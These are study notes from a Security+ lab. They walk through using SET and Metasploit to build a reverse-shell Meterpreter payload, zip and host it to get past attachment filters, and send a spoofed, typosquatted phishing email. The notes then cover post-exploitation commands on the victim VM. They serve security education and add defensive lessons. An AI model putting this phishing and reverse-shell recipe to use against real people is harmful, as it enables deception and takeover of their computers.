# Assisted Lab: Using SET to Perform Social Engineering — Obsidian Notes

## 📋 Lab Metadata

| Field                    | Value                                                                                     |
| ------------------------ | ----------------------------------------------------------------------------------------- |
| **Topic**                | Social-Engineer Toolkit (SET) — Phishing & Reverse Shell                                  |
| **Attacker VM**          | KALI (Kali Linux)                                                                         |
| **Victim VM**            | MS10 (Windows Server 2016, logged in as **Jaime**)                                        |
| **Tools**                | Social-Engineer Toolkit (SET), Metasploit (msfconsole), Apache2, Thunderbird, Meterpreter |

> [!info] Why this matters for Security+ This lab is a full **kill chain simulation**: recon-free social engineering → payload delivery → user execution → C2 (reverse shell) → post-exploitation enumeration.

---

## 🧩 Section 1 — Explore SET and Configure a Payload

### Launching & Navigating SET

In Kali Linux terminal

| Command              | Purpose                                                    |
| -------------------- | ---------------------------------------------------------- |
| `setoolkit`          | Launches SET's menu-driven interface                       |
| `1` (from main menu) | Enters **Social-Engineering Attacks** submenu (10 options) |
| `99`                 | Go up one menu level (at top level, exits SET)             |
| `Ctrl+C`             | Force-exits a sub-section mid-workflow                     |

### Social-Engineering Attacks Submenu — Options Toured

| #   | Option                              | Function                                                           |
| --- | ----------------------------------- | ------------------------------------------------------------------ |
| 1   | Spear-Phishing Attack Vectors       | Mass email attack, FileFormat payload, or custom template creation |
| 2   | Website Attack Vectors              | Clone/host malicious sites (e.g., credential harvesting)           |
| 3   | Infectious Media Generator          | Auto-run USB/CD/DVD launching a Metasploit payload                 |
| 4   | Create a Payload and Listener       | Generates reverse-shell payload + Metasploit listener              |
| 5   | Mass Mailer Attacks                 | Send phishing email to one address or an imported list             |
| 6   | Arduino-Based Attack Vector         | Hardware-delivered attacks (incl. X10 devices)                     |
| 7   | Wireless Access Point Attack Vector | On-path/AITM DNS attack via rogue WiFi AP                          |
| 8   | QRCode Generator Attack Vector      | Generates malicious QR codes pointing anywhere                     |
| 9   | PowerShell Attack Vectors           | Delivers PS scripts / remote PowerShell access                     |
| 10  | Third Party Modules                 | Community/custom attack modules                                    |

> [!warning] Detection: reality check SET's default payloads are **well-known signatures** — antimalware/IDS products will catch them at default settings without further obfuscation. This is an important nuance: SET's value here is teaching the _methodology_, not evading modern EDR.

> [!important] Quiz answer Attack type **NOT** supported by SET: **SQL Injection** (SET covers Wireless, Arduino, PowerShell, Spear Phishing, etc., but not SQLi directly).

---

## 🧩 Section 2 — Create a Spear Phishing Message

### 🔑 Key Architectural Insight: Why Two SET Instances?

> [!warning] The Listener Lockup Problem: Building a payload with **"start the listener now"** locks that SET session waiting for the connection. But you still need a _separate_ SET session to actually craft/send the phishing email. **Solution:** run two SET instances — one dedicated to payload+listener, one dedicated to the mass-mailer email.

### Instance 1 — Payload + Listener (Terminal Window #1)

| Step            | Value Entered            | Purpose                                                                                          |
| --------------- | ------------------------ | ------------------------------------------------------------------------------------------------ |
| Menu path       | `4` → `2`                | Create a Payload and Listener → Windows Reverse_TCP Meterpreter                                  |
| Listener IP     | `10.1.16.66`             | Kali VM's own IP (where the reverse shell calls back to)                                         |
| Listener Port   | `443`                    | Common port choice — blends with normal HTTPS traffic                                            |
| Output file     | `/root/.set/payload.exe` | Default SET payload save location (overwritten on regeneration — rename the old one to preserve) |
| Start listener? | `y`                      | Auto-launches `msfconsole` → `msf6 exploit(multi/handler) >` prompt                              |

> [!note] Port 443 as tradecraft: Choosing 443 isn't arbitrary — outbound HTTPS is almost always allowed through firewalls, so a reverse shell on that port is far less likely to be blocked or flagged than an unusual port.

### Packaging & Hosting the Payload (Terminal Window #2)

| Command                                     | Element Breakdown                                   | Purpose                                                              |
| ------------------------------------------- | --------------------------------------------------- | -------------------------------------------------------------------- |
| `cd /root/.set`                             | Navigate to SET's payload directory                 | Ensures zip has no nested subdirectories                             |
| `zip /var/www/html/acctupd.zip payload.exe` | `zip` = archive tool; target path = Apache web root | Wraps `.exe` in `.zip` — evades basic attachment/extension filtering |
| `service apache2 start`                     | Starts Kali's built-in web server                   | Hosts the zip for the victim to download via link                    |

> [!important] Why zip the payload? Most mail clients/gateways **strip or block raw executable attachments**. Wrapping in a `.zip` is a simple, common bypass technique — reinforcing why "know your file types" isn't enough; layered scanning (extracting archives) matters too.

### Instance 2 — Mass Mailer Phishing Email (New SET session)

|Step|Value Entered|Notes|
|---|---|---|
|Menu path|`1` → `5` → `1`|Social-Engineering Attacks → Mass Mailer → Single Email Address|
|Start Sendmail?|`yes`|Needed this time (declined during earlier "tour")|
|Send to|`jaime@structureality.com`|Target victim|
|Relay type|`2` (own server/open relay)|Alternative to Gmail-based sending|
|From address|`support@structurealty.com`|**Spoofed** — note missing "i" (structurealty vs. structureality)|
|From name|`Support Department`|Impersonates a trusted internal entity|
|Priority|`y` (high)|Adds urgency pressure|
|Attachment / inline attachment|`n` / `n`|Using hyperlink instead (attachments unreliable in lab)|
|Subject|`Important Account Update`|Generic, urgency-driven pretext|
|Format|`h` (HTML)|Enables clickable hyperlink rendering|
|Body|Link to `http://10.1.16.66/acctupd.zip`, urgency line about "certs expiring," signed "Support Department"|Classic phishing structure: pretext → call to action → false authority|
|End input|`END`|Terminates body entry|

> [!important] Typosquatting technique: `structurealty.com` vs. `structureality.com` is a **homoglyph/typosquat spoofing** technique — a single missing letter that's easy to miss on a quick glance. 

---

## 🧩 Section 3 — Be an Email Phishing Victim (MS10, as Jaime)

### Victim-Side Walkthrough

|Step|Action|Security Teaching Point|
|---|---|---|
|1|Open Thunderbird → Inbox → find "Important Account Update"|Simulates a normal user checking email|
|2|Click the **Update** link|User trusts the embedded hyperlink without hovering/inspecting the URL|
|3|Edge downloads `acctupd.zip`|File delivered via **link**, not attachment — bypasses attachment filters|
|4|Extract zip → see `payload` (extension hidden by default in File Explorer)|**File Explorer hides known extensions by default** — victim can't tell `payload` is actually `payload.exe`|
|5|Double-click `payload` → **Open File - Security Warning** appears|Windows' built-in SmartScreen/Unknown Publisher warning — the _last_ line of defense|
|6|Victim selects **Run** anyway|The human decision point where technical controls fail if awareness training hasn't stuck|

> [!warning] The core lesson of this lab: Every technical safeguard (extension hiding aside, that's actually a Windows weakness) funnels down to **one moment**: a security warning dialog that depends entirely on the user making the right call. 

> [!note] Hidden file extensions — a real vulnerability, not just lab flavor: Windows hiding known extensions by default means `payload.exe` displays as just `payload`, making it look less like an executable. This is a commonly cited hardening recommendation: **enable "show file extensions"** as a baseline endpoint control.

Once `Run` is selected: no visible change occurs on the victim's screen, but a **Meterpreter reverse shell session** silently establishes back to Kali.

---

## 🧩 Section 4 — Exploit the Victim via Reverse Shell (KALI, Metasploit)

### Meterpreter Command Reference
Now the connection happen to the kali machine

| Command         | Purpose                                                                          |
| --------------- | -------------------------------------------------------------------------------- |
| `sessions`      | Lists all active Meterpreter sessions                                            |
| `sessions -i 1` | Interacts with (connects to) session ID 1                                        |
| `sysinfo`       | Displays victim system info, including **computer/hostname**                     |
| `getuid`        | Shows the compromised account context — defines Meterpreter's privilege boundary |
| `help`          | Lists all available post-exploitation Meterpreter commands                       |

> [!important] Privilege context matters: `getuid` reveals that Meterpreter is running as whatever account executed the payload (**Jaime**, a standard user) — not SYSTEM/root. This ties into **least privilege** concepts: the blast radius of this compromise is initially bounded by Jaime's own permissions, though privilege escalation could extend it further (not covered in this lab).

### Comparison Table — Attacker vs. Victim Actions Across the Kill Chain

|Phase|Attacker (Kali)|Victim (MS10/Jaime)|
|---|---|---|
|Weaponization|Build payload + listener in SET|—|
|Delivery|Host `.zip` on Apache, send spoofed phishing email|Receives email in Thunderbird|
|Exploitation|Waits at `msf6 exploit(multi/handler)`|Clicks link, downloads, extracts, runs `payload`|
|Installation/C2|Meterpreter session auto-opens|Security warning dialog → clicks "Run" anyway|
|Actions on Objective|`sessions -i`, `sysinfo`, `getuid`, `help`|Unaware anything happened|

---

## 🧩 Comprehensive Questions — Quick Reference

|#|Question|Correct Answer|
|---|---|---|
|1|Primary defense against this attack|**Do not execute files from email**|
|2|Security framework SET uses for listeners|**Metasploit**|
|3|SET's most common features are spear phishing, website spoofing, payload delivery, mass mailer — T/F|**True**|
|4|Primary limitation in compromising via SET email/payload|**Client-side security blocking execution**|
|5|True statements about SET (select all)|SET can send to single or mass addresses; SET can send attachments **or** hyperlinks; SET emails can use **spoofed** source addresses; SET demonstrates combining tech + social engineering _(NOT: emails must be from a trusted domain; NOT: payloads are allow-listed)_|

---

## 🔑 Full Command Cheat Sheet (this lab)

|Command|Context|Purpose|
|---|---|---|
|`setoolkit`|Kali|Launch SET|
|`1` → `4` → `2`|SET menu|Create Payload and Listener → Windows Reverse_TCP Meterpreter|
|`zip /var/www/html/acctupd.zip payload.exe`|Kali shell|Package payload for web delivery|
|`service apache2 start`|Kali shell|Start web server hosting payload|
|`1` → `5` → `1`|SET menu|Mass Mailer → Single Email Address|
|`sessions`|msfconsole|List active Meterpreter sessions|
|`sessions -i <id>`|msfconsole|Interact with a session|
|`sysinfo`|Meterpreter|View victim system info|
|`getuid`|Meterpreter|View compromised user context|
|`help`|Meterpreter|List post-exploitation commands|
